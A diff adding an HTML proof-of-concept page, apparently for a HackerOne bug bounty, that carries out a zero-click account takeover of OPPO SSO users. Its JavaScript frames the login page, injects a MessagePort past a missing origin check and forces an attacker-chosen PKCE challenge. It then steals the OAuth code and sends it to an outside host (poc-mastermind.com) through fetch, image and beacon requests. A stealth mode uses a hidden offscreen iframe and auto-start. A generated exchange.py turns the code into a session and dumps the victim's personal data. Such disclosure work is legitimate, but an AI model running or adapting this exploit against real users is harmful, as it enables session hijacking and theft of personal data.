@@ -1,0 +1,463 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>OPPO SSO MessagePort Injection — ATO PoC</title>
+    <!--
+        OPPO SSO MessagePort Injection — Zero-Click Account Takeover
+        Bug Bounty: HackerOne oppo_bbp | X-HackerOne-Research: running_man
+
+        Root cause: checkPassPort(e) validates e.data only, NOT e.origin
+        + No X-Frame-Options / frame-ancestors on SSO pages
+        + Attacker controls PKCE codeChallenge (knows verifier)
+    -->
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: -apple-system, 'Segoe UI', system-ui, sans-serif; background: #0d1117; color: #c9d1d9; min-height: 100vh; }
+        .container { max-width: 900px; margin: 0 auto; padding: 24px; }
+        h1 { color: #f85149; font-size: 20px; margin-bottom: 4px; }
+        .subtitle { color: #8b949e; margin-bottom: 20px; font-size: 14px; }
+
+        /* Steps */
+        .step { background: #161b22; border: 1px solid #30363d; border-radius: 8px; padding: 20px; margin: 12px 0; position: relative; }
+        .step.locked { opacity: 0.4; pointer-events: none; }
+        .step.active { border-color: #58a6ff; }
+        .step.done { border-color: #3fb950; }
+        .step-num { display: inline-block; width: 28px; height: 28px; line-height: 28px; text-align: center; border-radius: 50%; font-weight: bold; font-size: 14px; margin-right: 10px; }
+        .step.locked .step-num { background: #30363d; color: #8b949e; }
+        .step.active .step-num { background: #1f6feb; color: #fff; }
+        .step.done .step-num { background: #238636; color: #fff; }
+        .step-title { font-size: 16px; font-weight: 600; display: inline; }
+        .step-body { margin-top: 12px; }
+        .step-status { float: right; font-size: 12px; padding: 4px 10px; border-radius: 12px; font-weight: 600; }
+        .status-waiting { background: #30363d; color: #8b949e; }
+        .status-running { background: #1f3d5c; color: #58a6ff; }
+        .status-done { background: #1f3d2d; color: #3fb950; }
+        .status-stolen { background: #3d1f1f; color: #f85149; }
+
+        /* Buttons */
+        .btn { padding: 10px 20px; border-radius: 6px; font-size: 14px; font-weight: 600; cursor: pointer; border: 1px solid transparent; }
+        .btn-primary { background: #238636; border-color: #2ea043; color: #fff; }
+        .btn-primary:hover { background: #2ea043; }
+        .btn-copy { background: #1f6feb; border-color: #388bfd; color: #fff; }
+        .btn-copy:hover { background: #388bfd; }
+        .btn-copy.copied { background: #238636; border-color: #2ea043; }
+        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
+
+        /* Code blocks */
+        .cmd-box { background: #0d1117; border: 1px solid #30363d; border-radius: 6px; padding: 12px; margin: 10px 0; position: relative; font-family: 'SF Mono', 'JetBrains Mono', monospace; font-size: 12px; color: #e6edf3; white-space: pre-wrap; word-break: break-all; line-height: 1.6; max-height: 200px; overflow-y: auto; }
+        .cmd-box .comment { color: #8b949e; }
+
+        /* iframe */
+        .iframe-wrap { width: 100%; max-width: 400px; height: 460px; border: 1px solid #30363d; border-radius: 6px; overflow: hidden; margin: 12px 0; }
+        .iframe-wrap iframe { width: 100%; height: 100%; border: none; }
+
+        /* Stolen alert */
+        .stolen-alert { background: #1c0b0b; border: 2px solid #f85149; border-radius: 6px; padding: 16px; margin: 12px 0; }
+        .stolen-alert h3 { color: #f85149; margin-bottom: 8px; }
+
+        /* Log */
+        .log { font-family: monospace; font-size: 12px; color: #8b949e; margin-top: 8px; max-height: 120px; overflow-y: auto; }
+        .log div { padding: 2px 0; }
+        .log .ok { color: #3fb950; }
+        .log .err { color: #f85149; }
+        .log .warn { color: #d29922; }
+
+        /* Stealth mode */
+        .stealth .visible-ui { display: none !important; }
+
+        /* Timer */
+        .timer { color: #8b949e; font-family: monospace; font-size: 13px; margin-left: 12px; }
+    </style>
+</head>
+<body>
+    <div class="container visible-ui">
+        <h1>OPPO SSO MessagePort Injection — Account Takeover</h1>
+        <p class="subtitle">id.oppo.com / id.heytap.com / id.realme.com → opposhop.cn session hijack</p>
+
+        <!-- STEP 1: Start Attack -->
+        <div class="step active" id="step1">
+            <span class="step-status status-waiting" id="step1-status">Ready</span>
+            <span class="step-num">1</span>
+            <span class="step-title">Steal Auth Code</span>
+            <div class="step-body">
+                <p style="margin-bottom:10px;color:#8b949e;">Embeds OPPO SSO login in an iframe and injects an attacker-controlled MessagePort to intercept the OAuth authorization code.</p>
+                <button class="btn btn-primary" id="btn-start" onclick="startStep1()">Start Attack (id.oppo.com)</button>
+                <span class="timer" id="timer"></span>
+                <div id="iframe-host" style="display:none;"></div>
+                <div class="log" id="log"></div>
+            </div>
+        </div>
+
+        <!-- STEP 2: Exchange Code (curl) -->
+        <div class="step locked" id="step2">
+            <span class="step-status status-waiting" id="step2-status">Waiting</span>
+            <span class="step-num">2</span>
+            <span class="step-title">Exchange Code for Session</span>
+            <div class="step-body">
+                <p style="margin-bottom:10px;color:#8b949e;">Copy this command and run it in <strong>any terminal</strong> (different machine, private tab, anywhere). It exchanges the stolen code for the victim's session JWT.</p>
+                <div class="cmd-box" id="exchange-cmd"><span class="comment"># Waiting for stolen code...</span></div>
+                <button class="btn btn-copy" id="btn-copy-exchange" onclick="copyCmd('exchange-cmd', this)" disabled>Copy Exchange Command</button>
+            </div>
+        </div>
+
+        <!-- STEP 3: Prove ATO -->
+        <div class="step locked" id="step3">
+            <span class="step-status status-waiting" id="step3-status">Waiting</span>
+            <span class="step-num">3</span>
+            <span class="step-title">Verify Account Takeover</span>
+            <div class="step-body">
+                <p style="color:#8b949e;">The Step 2 command does everything: gets state, exchanges the code, and fetches the victim's account info.</p>
+                <p style="margin-top:8px;color:#3fb950;font-size:13px;"><strong>Expected output:</strong></p>
+                <div class="cmd-box" style="color:#3fb950;">State: &lt;uuid&gt;
+Exchange: {"code":200,"message":"登录成功","success":true}    ← "Login Successful"
+Victim account: {
+  "accountName": "vi***@email.com",     ← victim's email
+  "oid": "...",                            ← victim's OPPO ID
+  "country": "..."                         ← victim's country
+}</div>
+                <p style="margin-top:10px;color:#f85149;font-size:13px;">If you see this from a different machine / private terminal → <strong>full ATO confirmed</strong>.</p>
+            </div>
+        </div>
+
+        <!-- Technical Details (collapsed) -->
+        <details style="margin-top:20px;">
+            <summary style="cursor:pointer;color:#58a6ff;font-weight:600;">Technical Details</summary>
+            <div class="step" style="margin-top:8px;border-color:#30363d;">
+                <ol style="line-height:2;padding-left:20px;font-size:13px;">
+                    <li>Page embeds SSO login in iframe — no <code>X-Frame-Options</code> or <code>frame-ancestors</code> set</li>
+                    <li>SSO iframe broadcasts readiness: <code>postMessage("..$$channel_loaded$$", "*")</code></li>
+                    <li>Attacker page (parent) intercepts broadcast, creates <code>MessageChannel</code></li>
+                    <li>Sends <code>port2</code> with passport message — <code>checkPassPort(e)</code> only checks <code>e.data</code>, <strong>NOT e.origin</strong></li>
+                    <li>Attacker injects own <code>codeChallenge</code> in SSO URL (controls PKCE)</li>
+                    <li>On login success: <code>{type:"login_success", code:"AUTH_CODE"}</code> sent to attacker's port</li>
+                    <li>Attacker exchanges code with known <code>codeVerifier</code> → gets victim's session JWT</li>
+                </ol>
+                <p style="margin-top:8px;font-size:13px;"><strong>Zero-click:</strong> If victim has active SSO session, auto-login fires in the hidden iframe — no interaction needed.</p>
+            </div>
+        </details>
+    </div>
+
+    <!-- Stealth: hidden iframe container for invisible mode -->
+    <div id="stealth-frame" style="position:absolute;width:1px;height:1px;overflow:hidden;left:-9999px;top:-9999px;"></div>
+
+    <script>
+    // ================================================================
+    // OPPO SSO MessagePort Injection — Full ATO PoC
+    // X-HackerOne-Research: running_man
+    // ================================================================
+
+    // Attacker-controlled PKCE
+    const ATTACKER_VERIFIER = 'mastermind_attacker_pkce_verifier_value_43plus_chars';
+    let ATTACKER_CHALLENGE = null;
+
+    const CONFIG = {
+        TRIGGER_BASE: 'https://poc-mastermind.com/trigger',
+        SSO: { oppo: 'id.oppo.com', heytap: 'id.heytap.com', realme: 'id.realme.com' },
+        DELEGATOR: '[MessageChannelDelegator-name]: login',
+        get INIT_MSG()     { return this.DELEGATOR + '$$channel_loaded$$'; },
+        get PASSPORT_MSG() { return this.DELEGATOR + '$$message_channel_port_passed$$'; },
+        LOGIN_PATH_BASE: '/v3/popper/login?bizAppKey=WJ9mxZSYJBYQL91FFowN6X&callback=https://www.opposhop.cn&type=1',
+        get LOGIN_PATH() {
+            return ATTACKER_CHALLENGE
+                ? this.LOGIN_PATH_BASE + '&codeChallenge=' + ATTACKER_CHALLENGE
+                : this.LOGIN_PATH_BASE;
+        },
+        CALLBACK: 'https://www.opposhop.cn',
+        STEALTH: false,
+        OOB_TOKEN: null
+    };
+
+    // Parse URL params
+    const params = new URLSearchParams(location.search);
+    CONFIG.OOB_TOKEN = params.get('token') || null;
+    if (params.get('stealth') === '1') CONFIG.STEALTH = true;
+    const autoProvider = params.get('provider') || null;
+
+    let attackState = { phase: 0, startTime: null, timerInterval: null, port1: null, iframe: null, handler: null, stolenCode: null };
+
+    // ============== PKCE ==============
+
+    async function computePKCE() {
+        const hash = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(ATTACKER_VERIFIER));
+        ATTACKER_CHALLENGE = [...new Uint8Array(hash)].map(b => b.toString(16).padStart(2, '0')).join('');
+    }
+
+    // ============== UI HELPERS ==============
+
+    function log(msg, level = '') {
+        if (CONFIG.STEALTH) { console.log('[PoC]', msg); return; }
+        const el = document.getElementById('log');
+        if (!el) return;
+        const d = document.createElement('div');
+        d.className = level;
+        d.textContent = `${new Date().toISOString().split('T')[1].split('.')[0]} ${msg}`;
+        el.appendChild(d);
+        el.scrollTop = el.scrollHeight;
+    }
+
+    function setStep(num, status, statusText) {
+        const step = document.getElementById('step' + num);
+        const badge = document.getElementById('step' + num + '-status');
+        if (!step || !badge) return;
+        step.className = 'step ' + (status === 'active' ? 'active' : status === 'done' ? 'done' : 'locked');
+        badge.className = 'step-status status-' + (status === 'active' ? 'running' : status === 'done' ? 'done' : 'waiting');
+        badge.textContent = statusText || status;
+    }
+
+    function copyCmd(id, btn) {
+        const el = document.getElementById(id);
+        if (!el) return;
+        const text = el.textContent;
+        navigator.clipboard.writeText(text).then(() => {
+            btn.textContent = 'Copied!';
+            btn.classList.add('copied');
+            setTimeout(() => { btn.textContent = btn.dataset.label || 'Copy'; btn.classList.remove('copied'); }, 2000);
+        });
+    }
+
+    // ============== STEP 1: ATTACK ==============
+
+    async function startStep1() {
+        await computePKCE();
+
+        const btn = document.getElementById('btn-start');
+        btn.disabled = true;
+        btn.textContent = 'Running...';
+
+        setStep(1, 'active', 'Attacking...');
+        attackState.startTime = Date.now();
+        attackState.timerInterval = setInterval(() => {
+            const el = document.getElementById('timer');
+            if (el) el.textContent = ((Date.now() - attackState.startTime) / 1000).toFixed(1) + 's';
+        }, 100);
+
+        const domain = CONFIG.SSO.oppo;
+        const ssoUrl = `https://${domain}${CONFIG.LOGIN_PATH}`;
+
+        log('Embedding SSO iframe (no X-Frame-Options = frameable)');
+        log('PKCE: attacker codeChallenge = ' + ATTACKER_CHALLENGE.substring(0, 16) + '...');
+
+        // Create iframe
+        const iframe = document.createElement('iframe');
+        iframe.src = ssoUrl;
+        iframe.style.cssText = 'width:100%;max-width:400px;height:460px;border:none;border-radius:6px;';
+        attackState.iframe = iframe;
+
+        if (CONFIG.STEALTH) {
+            document.getElementById('stealth-frame').appendChild(iframe);
+        } else {
+            const host = document.getElementById('iframe-host');
+            host.style.display = 'block';
+            host.innerHTML = '';
+            host.className = 'iframe-wrap';
+            host.appendChild(iframe);
+        }
+
+        // Listen for broadcast
+        attackState.handler = function(event) {
+            if (event.data === CONFIG.INIT_MSG) {
+                log('SSO broadcast intercepted — injecting attacker MessagePort', 'ok');
+                injectPort(domain);
+            }
+        };
+        window.addEventListener('message', attackState.handler);
+
+        setTimeout(() => { if (attackState.phase < 2) log('Waiting for SSO to load (if active session: auto-login is zero-click)...', 'warn'); }, 3000);
+    }
+
+    function injectPort(domain) {
+        const channel = new MessageChannel();
+        attackState.port1 = channel.port1;
+
+        channel.port1.onmessage = function(e) {
+            if (e.data && e.data.type === 'login_success') {
+                handleCodeStolen(e.data, domain);
+            } else if (e.data && e.data.type === 'start_show_popper') {
+                log('SSO iframe ready (victim sees login form)', 'ok');
+            }
+        };
+        channel.port1.start();
+
+        attackState.iframe.contentWindow.postMessage(CONFIG.PASSPORT_MSG, '*', [channel.port2]);
+        attackState.phase = 2;
+        log('MessagePort injected! checkPassPort() accepted (no origin check)', 'ok');
+        log('Armed — waiting for login_success...', 'warn');
+    }
+
+    function handleCodeStolen(data, domain) {
+        const code = data.code || '';
+        const elapsed = ((Date.now() - attackState.startTime) / 1000).toFixed(1);
+        attackState.stolenCode = code;
+
+        clearInterval(attackState.timerInterval);
+        if (attackState.handler) window.removeEventListener('message', attackState.handler);
+
+        log('AUTH CODE STOLEN: ' + code, 'err');
+        log('Stolen in ' + elapsed + 's' + (elapsed < 20 ? ' (zero-click — auto-login)' : ''));
+
+        // Update Step 1
+        setStep(1, 'done', 'Code Stolen (' + elapsed + 's)');
+        document.getElementById('btn-start').textContent = 'Code Stolen: ' + code;
+
+        // OOB exfiltrate if token provided
+        if (CONFIG.OOB_TOKEN) {
+            const triggerUrl = CONFIG.TRIGGER_BASE + '?' + new URLSearchParams({
+                token: CONFIG.OOB_TOKEN,
+                stolen_code: code,
+                code_verifier: ATTACKER_VERIFIER,
+                code_challenge: ATTACKER_CHALLENGE,
+                attack_domain: domain,
+                timestamp: new Date().toISOString(),
+                type: 'oppo_messageport_ato'
+            }).toString();
+            fetch(triggerUrl, { mode: 'no-cors' }).catch(() => {});
+            new Image().src = triggerUrl;
+            try { navigator.sendBeacon(triggerUrl); } catch(e) {}
+        }
+
+        // Unlock Step 2 with pre-populated command
+        populateExchangeCmd(code);
+    }
+
+    // ============== STEP 2: EXCHANGE ==============
+
+    function populateExchangeCmd(code) {
+        setStep(2, 'active', 'Ready — Download & Run');
+
+        // Generate a self-contained Python script with the stolen code baked in
+        const script = [
+            '#!/usr/bin/env python3',
+            '"""',
+            'OPPO SSO MessagePort Injection — Account Takeover Exchange',
+            'This script exchanges a stolen OAuth authorization code for the victim\'s session.',
+            'Run on ANY machine — does not need to be the same machine as the victim.',
+            '',
+            'Usage: python3 exchange.py',
+            '"""',
+            'import subprocess, json, sys',
+            '',
+            '# STOLEN from victim via MessagePort injection (short TTL, one-time use)',
+            'STOLEN_CODE = "' + code + '"',
+            '',
+            '# ATTACKER-GENERATED: we put our codeChallenge in the iframe URL,',
+            '# so we know the matching verifier. PKCE cannot protect against this.',
+            'VERIFIER = "' + ATTACKER_VERIFIER + '"',
+            '',
+            '# State is fetched fresh below (unauthenticated API — anyone can request it)',
+            'COOKIE = "/tmp/ato.txt"',
+            'BASE = "https://www.opposhop.cn"',
+            '',
+            'print()',
+            'print("OPPO SSO MessagePort Injection — Account Takeover Exchange")',
+            'print("=" * 60)',
+            'print()',
+            'print("[1/3] Getting fresh OAuth state from opposhop.cn...")',
+            'print("       This is unauthenticated — anyone can request it.")',
+            'r = subprocess.run(["curl", "-s", "-c", COOKIE,',
+            '  BASE + "/cn/oapi/auth/api/account/state?bizAppKey=WJ9mxZSYJBYQL91FFowN6X"],',
+            '  capture_output=True, text=True)',
+            'state = json.loads(r.stdout)["data"]["state"]',
+            'print("       State:", state)',
+            'print()',
+            '',
+            'print("[2/3] Exchanging stolen authorization code for session JWT...")',
+            'print("       Stolen code: " + STOLEN_CODE)',
+            'print("       Attacker\'s codeVerifier: " + VERIFIER[:20] + "...")',
+            'body = json.dumps({"code": STOLEN_CODE, "state": state, "codeVerifier": VERIFIER})',
+            'r = subprocess.run(["curl", "-s", "-b", COOKIE, "-c", COOKIE,',
+            '  "-H", "Content-Type: application/json", "-d", body,',
+            '  BASE + "/cn/oapi/auth/api/account/login"],',
+            '  capture_output=True, text=True)',
+            'resp = json.loads(r.stdout)',
+            'ok = resp.get("success", False)',
+            'print("       Server response:", resp.get("message", "?"), "(" + ("SUCCESS" if ok else "FAILED") + ")")',
+            'print()',
+            'if not ok:',
+            '    print("  [!] Exchange failed. The code likely expired (short TTL).")',
+            '    print("      Go back to the PoC, steal a fresh code, download a new exchange.py.")',
+            '    sys.exit(1)',
+            '',
+            'print("[3/3] Using stolen session to access victim\'s account...")',
+            'print("       Proving the attacker can read victim\'s private data.")',
+            'print()',
+            'r = subprocess.run(["curl", "-s", "-b", COOKIE,',
+            '  BASE + "/cn/oapi/users/web/member/info"],',
+            '  capture_output=True, text=True)',
+            'acct = json.loads(r.stdout).get("data", {})',
+            '',
+            'print("=" * 60)',
+            'print("  ACCOUNT TAKEOVER SUCCESSFUL")',
+            'print("=" * 60)',
+            'print()',
+            'print("  The attacker now has the victim\'s opposhop.cn session.")',
+            'print("  This was obtained from a DIFFERENT machine with NO prior")',
+            'print("  access to the victim\'s cookies or credentials.")',
+            'print()',
+            'print("  Victim\'s private data retrieved by attacker:")',
+            'print("  ─────────────────────────────────────────────")',
+            'print("  Account ID:   " + acct.get("id", "N/A"))',
+            'print("  Email:        " + acct.get("accountName", "N/A"))',
+            'print("  Username:     " + acct.get("userName", "N/A"))',
+            'print("  Real Name:    " + acct.get("realName", "N/A"))',
+            'print("  Country:      " + acct.get("country", "N/A"))',
+            'print("  Birthday:     " + acct.get("birthday", "N/A"))',
+            'print("  Sex:          " + str(acct.get("sex", "N/A")))',
+            'print("  Age Class:    " + acct.get("classifyByAge", "N/A"))',
+            'print("  Mobile:       " + str(acct.get("maskMobile", "N/A")))',
+            'print("  OPPO ID:      " + acct.get("oid", "N/A"))',
+            'print("  User ID Hash: " + acct.get("userIdStr", "N/A"))',
+            'print("  Avatar:       " + acct.get("avatarDefault", "N/A"))',
+            'print("  Child Acct:   " + str(acct.get("childAccount", "N/A")))',
+            'import datetime',
+            'ts = acct.get("createTime")',
+            'created = datetime.datetime.fromtimestamp(ts/1000).strftime("%Y-%m-%d %H:%M:%S") if ts else "N/A"',
+            'print("  Created:      " + created)',
+            'print()',
+            'print("  Session cookie saved to: " + COOKIE)',
+            'print("  The attacker can use this cookie to perform any action")',
+            'print("  as the victim: view orders, change address, make purchases.")',
+            'print()',
+            'print("  To continue using the stolen session:")',
+            'print("    curl -b " + COOKIE + " \'https://www.opposhop.cn/cn/oapi/...\'")',
+            'print("=" * 60)',
+        ].join('\n');
+
+        // Show preview in the cmd box
+        document.getElementById('exchange-cmd').textContent =
+            '# Downloaded as exchange.py — run with:\npython3 exchange.py';
+
+        // Wire up the download button
+        const btn = document.getElementById('btn-copy-exchange');
+        btn.disabled = false;
+        btn.textContent = 'Download exchange.py';
+        btn.dataset.label = 'Download exchange.py';
+        btn.onclick = function() {
+            const blob = new Blob([script], { type: 'text/x-python' });
+            const url = URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.href = url;
+            a.download = 'exchange.py';
+            a.click();
+            URL.revokeObjectURL(url);
+            btn.textContent = 'Downloaded!';
+            btn.classList.add('copied');
+            setTimeout(() => { btn.textContent = btn.dataset.label; btn.classList.remove('copied'); }, 2000);
+        };
+
+        // Unlock Step 3
+        setStep(3, 'active', 'Ready');
+    }
+
+    // ============== STEALTH / AUTO-START ==============
+
+    if (CONFIG.STEALTH) {
+        document.documentElement.classList.add('stealth');
+    }
+
+    // Auto-start if provider specified or stealth
+    if (autoProvider || CONFIG.STEALTH) {
+        computePKCE().then(() => startStep1());
+    }
+    </script>
+</body>
+</html>
